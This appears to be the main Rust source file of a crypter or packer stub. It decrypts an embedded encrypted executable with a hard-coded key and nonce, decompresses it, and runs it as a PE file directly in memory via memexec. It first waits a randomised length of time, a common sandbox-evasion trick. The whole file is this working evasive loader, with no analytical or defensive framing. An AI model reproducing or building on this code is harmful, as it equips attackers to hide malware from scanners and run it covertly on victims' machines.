use constants::*;
use rand::{thread_rng, Rng};
use std::{thread::sleep, time::Duration, io};

mod constants;
mod deobfuscation;
mod loader;

fn main() -> io::Result<()> {
    wait();

    let decrypted_binary = deobfuscation::decrypt_data(
        unsafe { &mut ENCRYPTED_BINARY },
        ENCRYPTION_KEY,
        ENCRYPTION_NONCE,
    );

    const ASLR: bool = false;

    let mut decompress_binary = vec![];

    deobfuscation::decompress_data(decrypted_binary, &mut decompress_binary)?;

    unsafe {
        memexec::memexec_exe(&decompress_binary).expect("the PE file should load fine");
    }

    Ok(())
}

fn wait() {
    if !TIMEOUT.is_zero() {
        let mut rng = thread_rng();
        let random_offset =
            Duration::from_millis(rng.gen_range(0..((TIMEOUT.as_millis() as u64) / 4)));
        if rng.gen_bool(0.5) {
            sleep(TIMEOUT - random_offset)
        } else {
            sleep(TIMEOUT + random_offset)
        }
    }
}